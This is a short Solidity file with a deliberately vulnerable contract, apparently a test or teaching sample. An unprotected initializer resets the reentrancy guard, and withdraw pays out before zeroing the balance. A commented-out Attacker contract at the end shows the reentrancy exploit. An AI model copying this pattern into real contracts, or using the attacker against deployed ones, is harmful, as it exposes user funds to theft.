pragma solidity ^0.8.20;

// SPDX-License-Identifier: GPL-3.0
contract C {

    mapping (address => uint256) public balances;

    //OpenZeppelin-style flags make more sense here cause they need to be initialized
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status; // 0 if not intialized

    uint256 public currentVersion;
    bool private initializedV2;

    constructor (){
        _status = _NOT_ENTERED;
        currentVersion = 2;
    }

    // this function was actually implemented as it is in a contract called Trustswap and allowed a one time reentrancy attack
    function initializePoolV2() external {
        if (initializedV2) {
            revert("Already IntializedV2");
        }
        initializedV2 = true;
        currentVersion = 2;
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }

    function withdraw() nonReentrant public {
        uint amt = balances[msg.sender];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = msg.sender.call{value:amt}("");
        require(success, "Call failed");
        balances[msg.sender] = 0;
    }

    function deposit() nonReentrant public payable {
        balances[msg.sender] += msg.value;       
    }

}

// contract Attacker {
//     C private c;
//     address to;
//     constructor(address v, address _to) {
//         to = _to;
//         c = C(v);
//     }
//     function attack() public {
//         c.deposit{value: 100}();
//         c.withdraw();
//         // now, if the address 'to' calls withdraw() then both the attacker and 'to' will own 100 each
//     }
//     receive() external payable {
//         c.initializePoolV2();
//         c.withdraw();
//     } 
// }